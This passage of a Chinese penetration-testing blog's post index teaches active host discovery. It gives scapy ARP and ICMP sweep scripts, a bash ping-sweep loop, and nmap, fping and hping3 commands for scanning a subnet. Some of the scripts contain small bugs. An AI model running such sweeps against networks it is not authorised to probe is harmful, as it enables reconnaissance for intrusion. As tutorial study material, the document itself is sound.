str(n)),timeout = <span class="number">1</span>,verbose = <span class="number">0</span>)</span><br><span class="line">&gt;             <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                 <span class="keyword">pass</span></span><br><span class="line">&gt;             <span class="keyword">else</span>:</span><br><span class="line">&gt;                 <span class="keyword">print</span> prefix + str(n)</span><br><span class="line">&gt;             n += <span class="number">1</span></span><br><span class="line">&gt;             lock.release()</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     n = <span class="number">1</span></span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start()</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; interface = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt;</span><br><span class="line">&gt; ip = subprocess.check_output(</span><br><span class="line">&gt;     <span class="string">"ifconfig "</span> + interface + <span class="string">" | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 "</span>,</span><br><span class="line">&gt;     shell = <span class="keyword">True</span>).strip()</span><br><span class="line">&gt; prefix = ip.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> answer,lock</span><br><span class="line">&gt;         time.sleep(<span class="number">0.1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">&gt;                 answer = sr1(ARP(pdst = prefix + str(addr)),timeout = <span class="number">1</span>,verbose = <span class="number">0</span>)</span><br><span class="line">&gt;                 <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                     <span class="keyword">pass</span></span><br><span class="line">&gt;                 <span class="keyword">else</span>:</span><br><span class="line">&gt;                     <span class="keyword">print</span> prefix + str(addr)</span><br><span class="line">&gt;             lock.release()</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start()</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<ol start="2">
<li><blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [filename]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py ip_list.txt"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; filename = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt; file = open(filename,<span class="string">'r'</span>)  <span class="comment"># 打开文件列表</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">Mythread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> lock</span><br><span class="line">&gt;         time.sleep(<span class="number">1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             <span class="keyword">for</span> addr <span class="keyword">in</span> file:</span><br><span class="line">&gt;                 answer = sr1(ARP(pdst = addr.strip()),timeout = <span class="number">0.1</span>,</span><br><span class="line">&gt;                              verbose = <span class="number">0</span>)  <span class="comment"># verbose=0，不显示报错的具体信息,这里循环打开的是文件中的每一行IP地址</span></span><br><span class="line">&gt;                 <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                     <span class="keyword">pass</span></span><br><span class="line">&gt;                 <span class="keyword">else</span>:</span><br><span class="line">&gt;                     <span class="keyword">print</span> addr.strip()  <span class="comment"># 将报错信息打印出来</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集——三层发现</title>
    <url>/2018/06/05/%E5%9F%BA%E4%BA%8ETCP-IP%E7%9A%84%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0.md/</url>
    <content><![CDATA[<ul>
<li>三层发现的优点<ul>
<li>可路由</li>
<li>速度快</li>
</ul>
</li>
<li>缺点<ul>
<li>速度比二层慢</li>
<li>经常被边界防火墙过滤(还有可能出现宕机状态）</li>
</ul>
</li>
<li>IP、ICMP、TCP协议</li>
</ul>
<ol>
<li><p>ping</p>
<ul>
<li><p>使用ping命令的时候如果可以接发包，使用的是数据包的type8，如果不可以使用的是type0</p>
</li>
<li><p>ping -192.168.0.102 -c 5         在这里linux和Windows的ping包有些不同，使用-c 可以指定发送多少个数据包</p>
</li>
<li><p>进行三层的发现除了进行icmp的探测之外还可以用路由追踪 <figure class="highlight plain"><figcaption><span>使用路由追踪命令可能会被边界路由拦截，但是路由追踪和ping有点不同，它先会将TTL值设置为1，在经过第一跳路由以后减一，这个时候就会发送数据包</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 使用traceroute和ping -R命令有点不同，使用traceroute返回的是较近的网卡，而使用ping -R返回的是较远的网卡</span><br><span class="line"></span><br><span class="line">- ```ping 192.168.1.103 -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1``` 这样使用管道就可以将存在的ip显示出来</span><br><span class="line"></span><br><span class="line">- 由于ping命令本身不支持一个网段的并发性扫描，所以通过脚本来实现，三层的发现简单bash脚本：</span><br><span class="line"></span><br><span class="line">  ```bash</span><br><span class="line">  #/bin/bash</span><br><span class="line">  if [ &quot;$#&quot; -ne 1 ]; then</span><br><span class="line">      echo &quot;Usage - ./ping.sh [interface]&quot;</span><br><span class="line">      echo &quot;Example - ./ping.sh 192.168.1.0&quot;</span><br><span class="line">      echo &quot;Example will perform an ICMP&quot;</span><br><span class="line">  exit</span><br><span class="line">  fi</span><br><span class="line">      prefix=$(echo $1 | cut -d &apos;.&apos; -f 1-3)</span><br><span class="line">      for addr in $(seq 1 254); do</span><br><span class="line">      ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &gt;&gt; addr.txt</span><br><span class="line">  done</span><br></pre></td></tr></table></figure></p>
</li>
<li><p>除了使用bash调用ping命令之外，还可以使用scopy类似于二层发现时的脚本来进行主机发现，使用scopy的时候一定要设置超时，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage - ./pingr 0/24 ICMP"</span>  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Example - ./pingr 192.168.0.103"</span>  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Example will perform an ICMP scan of the 192.168.0.0/24 range"</span>  </span><br><span class="line">sys.exit()</span><br><span class="line">address = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">prefix = address.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + address.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + address.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">    answer=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)     </span><br><span class="line">    <span class="keyword">if</span> answer == <span class="keyword">None</span>:       </span><br><span class="line">        <span class="keyword">pass</span>   </span><br><span class="line">    <span class="keyword">else</span>:   </span><br><span class="line">        <span class="keyword">print</span> prefix+str(addr)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<ul>
<li>使用脚本也可以调用已经存在的IP列表进行扫描，这样将脚本改为加载ip文件，然后调用扫描就可以了</li>
</ul>
<ol start="2">
<li><p>除了使用ping和traceroute之外还可以使用nmap进行三层的发现：</p>
<ul>
<li><figure class="highlight plain"><figcaption><span>192.168.1.103 -sn```  nmap 使用-sn的时候如果是在本网段的网络会发送arp包，如果不是在本网段会发送icmp的数据包，但由于nmap使用了大量不同的技术手段去探测目标，所以还会发送tcp的数据包。</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3. fping :比ping的命令强大一点</span><br><span class="line"></span><br><span class="line">   - ```fping 192.168.1.103 -c 10</span><br></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><figcaption><span>-g 192.168.1.1 192.168.1.103  -c 10``` fping 与ping命令不同的是将一个ip段进行扫描，也可以使用0/24扫描，只显示ip的话可以使用管道进行分割</span></figcaption><table><tr><td class="code"><pre><span class="line">   - ```fping -f iplist.txt``` 调用ip列表文件</span><br><span class="line"></span><br><span class="line">4. hping :</span><br><span class="line"></span><br><span class="line">   - 能发送几乎任意TCO/IP的数据包，在一定程度上可以进行压力测试</span><br><span class="line"></span><br><span class="line">   - 功能强大，但每次只能扫描一个目标</span><br><span class="line"></span><br><span class="line">   - ```hping3 192.168.1.103 --icmp -c 2``` 也可以进行三层扫描</span><br><span class="line"></span><br><span class="line">   - 也可以使用一行的方式实现一个ip段的扫描，因为显示的内容太多，所以将扫描结果保存到一个TXT文件中</span><br><span class="line"></span><br><span class="line">      ```for addr in $(seq 1 254);do hping3 192.168.1.$addr --icmp -c 1 &gt;&gt; hping.txt &amp; done</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
</search>
